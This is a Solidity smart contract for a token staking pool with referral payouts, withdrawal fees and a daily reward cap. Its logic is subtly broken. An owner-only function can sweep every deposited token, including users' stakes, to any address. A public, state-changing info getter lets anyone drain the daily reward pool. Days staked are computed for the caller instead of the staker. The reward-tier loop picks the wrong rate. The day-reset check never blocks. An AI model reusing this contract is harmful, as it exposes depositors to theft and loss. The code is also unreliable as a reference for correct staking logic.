// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract StakingWinX is ReentrancyGuard, Ownable {
    using SafeERC20 for IERC20;

    IERC20 public immutable rewardsToken;

    struct rewardSchedule {
        uint64 days30;
        uint64 days45;
        uint64 days60;
        uint64 days90;
    }

    rewardSchedule public rewardMultiplier =
        rewardSchedule({days30: 2, days45: 3, days60: 4, days90: 6});

    struct Staker {
        address referal;
        uint256 deposited;
        uint256 timeOfLastUpdate;
        uint256 unclaimedRewards;
        uint256 startStaking;
    }

    address private burnable;

    // Rewards per hour. A fraction calculated as x/10.000.000 to get the percentage
    uint256 public rewardsPerHour; // 0.0416%/h or 1%/day
    uint256 public minStake = 1 * 10 ** 18;
    uint256 private maxRewardDay;
    uint256 private dayTime;
    uint256 public totalStaked;

    mapping(address => Staker) internal stakers;

    event Stake(address staker, uint256 _amount);

    event Withdraw(address staker, uint256 _deposit);

    constructor(address _token, address _burnable) {
        rewardsToken = IERC20(_token);
        rewardsPerHour = 4160;
        maxRewardDay = 13088133333 * 10 ** 18;
        dayTime = block.timestamp;
        burnable = _burnable;
    }

    function changeMaxRewardDay(uint256 _newreward) external onlyOwner {
        maxRewardDay = _newreward;
    }

    function changeRewardPerHour(uint256 _newreward) external onlyOwner {
        rewardsPerHour = _newreward;
    }

    function rewardPerDay() internal {}

    function deposit(
        uint256 _amount,
        address referalAddress
    ) external nonReentrant {
        require(_amount >= minStake, "Amount smaller than minimimum deposit");
        require(
            rewardsToken.balanceOf(msg.sender) >= _amount,
            "Can't stake more than you own"
        );

        // !необходимо выдать апрув данному контракту перед стейкингом
        rewardsToken.transferFrom(msg.sender, address(this), _amount);

        if (stakers[msg.sender].deposited == 0) {
            stakers[msg.sender].deposited = _amount;
            stakers[msg.sender].timeOfLastUpdate = block.timestamp;
            stakers[msg.sender].unclaimedRewards = 0;
            stakers[msg.sender].startStaking = block.timestamp;
            totalStaked += _amount;
            if (referalAddress != address(0)) {
                stakers[msg.sender].referal = referalAddress;
            }
        } else {
            uint256 rewards = calculateRewards(msg.sender);
            stakers[msg.sender].unclaimedRewards += rewards;
            stakers[msg.sender].deposited += _amount;
            stakers[msg.sender].timeOfLastUpdate = block.timestamp;
            totalStaked += _amount;
            // stakers[msg.sender].startStaking = block.timestamp;
        }

        emit Stake(msg.sender, _amount);
    }

    // Mints rewards for msg.sender
    function claimRewards() external nonReentrant {
        Staker storage staker = stakers[msg.sender];

        uint256 rewards = calculateRewards(msg.sender) +
            staker.unclaimedRewards;
        require(rewards > 0, "You have no rewards");

        staker.unclaimedRewards = 0;
        staker.timeOfLastUpdate = block.timestamp;

        uint256 refReward = (9 * rewards) / 100;
        uint256 comissionWithRef = (1 * rewards) / 100;
        uint256 comission = (2 * rewards) / 100;

        if (staker.referal != address(0)) {
            rewardsToken.transfer(stakers[msg.sender].referal, refReward);
            rewardsToken.transfer(burnable, comissionWithRef);
            rewards -= (refReward + comissionWithRef);
        } else {
            rewards -= comission;
            rewardsToken.transfer(burnable, comission);
        }

        rewardsToken.transfer(msg.sender, rewards);
    }

    function withdraw(uint256 _amount) external nonReentrant {
        require(
            stakers[msg.sender].deposited >= _amount,
            "You have not enough deposit"
        );
        uint256 rewards = calculateRewards(msg.sender) +
            stakers[msg.sender].unclaimedRewards;
        stakers[msg.sender].unclaimedRewards = 0;
        stakers[msg.sender].deposited -= _amount;
        stakers[msg.sender].timeOfLastUpdate = block.timestamp;

        uint256 amounwithdraw = _amount + rewards;

        uint256 comission;

        if (stakers[msg.sender].startStaking + 30 days >= block.timestamp) {
            comission = (10 * _amount) / 100;
            rewardsToken.transfer(burnable, comission);
        } else {
            comission = 0;
        }

        rewardsToken.transfer(msg.sender, amounwithdraw - comission);

        totalStaked -= _amount;

        emit Withdraw(msg.sender, amounwithdraw);
    }

    // Withdraw specified amount of staked tokens
    function withdrawAll() external nonReentrant {
        require(stakers[msg.sender].deposited > 0, "You have no deposit");
        uint256 rewards = calculateRewards(msg.sender) +
            stakers[msg.sender].unclaimedRewards;
        uint256 _deposit = stakers[msg.sender].deposited;
        stakers[msg.sender].unclaimedRewards = 0;
        stakers[msg.sender].deposited = 0;
        stakers[msg.sender].timeOfLastUpdate = 0;

        uint256 amounwithdraw = _deposit + rewards;

        uint256 comission;

        if (stakers[msg.sender].startStaking + 30 days >= block.timestamp) {
            comission = (10 * _deposit) / 100;
            rewardsToken.transfer(burnable, comission);
        } else {
            comission = 0;
        }

        rewardsToken.transfer(msg.sender, amounwithdraw - comission);

        totalStaked -= _deposit;

        emit Withdraw(msg.sender, amounwithdraw);
    }

    // Function useful for fron-end that returns user stake and rewards by address
    function getDepositInfo(
        address _user
    ) public returns (uint256 _stake, uint256 _rewards, uint256 _startStaking) {
        _stake = stakers[_user].deposited;
        _rewards = calculateRewards(_user) + stakers[_user].unclaimedRewards;
        _startStaking = stakers[_user].startStaking;
        return (_stake, _rewards, _startStaking);
    }

    function getYieldMultiplier(
        uint256 daysStaked
    ) public view returns (uint256) {
        if (daysStaked >= 90) return rewardMultiplier.days90;
        if (daysStaked >= 60) return rewardMultiplier.days60;
        if (daysStaked >= 45) return rewardMultiplier.days45;
        if (daysStaked >= 30) return rewardMultiplier.days30;
        return 1;
    }

    function calculateRewards(address _staker) internal returns (uint256) {
        uint256 daysStaked = (block.timestamp -
            stakers[msg.sender].startStaking) / 1 days;
        uint256 yieldMultiplier = getYieldMultiplier(daysStaked);
        uint256 rewardPerHours;

        uint256[7] memory bounds = [
            uint256(10000 * 10 ** 18),
            1000000 * 10 ** 18,
            10000000 * 10 ** 18,
            100000000 * 10 ** 18,
            1000000000 * 10 ** 18,
            10000000000 * 10 ** 18,
            100000000000 * 10 ** 18
        ];

        uint256[7] memory rewardValues = [
            uint256(4160),
            3500,
            3000,
            2500,
            2000,
            1500,
            1000
        ];

        for (uint256 i = 0; i < bounds.length; i++) {
            if (stakers[_staker].deposited <= bounds[i]) {
                rewardPerHours = rewardValues[i];
            }
        }

        uint256 allrewards = (((((block.timestamp -
            stakers[_staker].timeOfLastUpdate) * stakers[_staker].deposited) *
            rewardPerHours) / 3600) / 10000000) * yieldMultiplier;

        if (maxRewardDay >= allrewards) {
            maxRewardDay -= allrewards;
            return allrewards;
        } else {
            uint256 returnReward = maxRewardDay;
            maxRewardDay = 0;
            return returnReward;
        }
    }

    function WithdrawFromContract(address to) external onlyOwner {
        uint256 balance = rewardsToken.balanceOf(address(this));
        rewardsToken.transfer(to, balance);
    }

    //!необходимо запустить скрипт, который каждый день будет обновлять пул наград
    function changeDay() external onlyOwner {
        require(dayTime >= 1 days, "Day is not end");
        dayTime = block.timestamp;
        maxRewardDay = 13088133333 * 10 ** 18;
    }
}
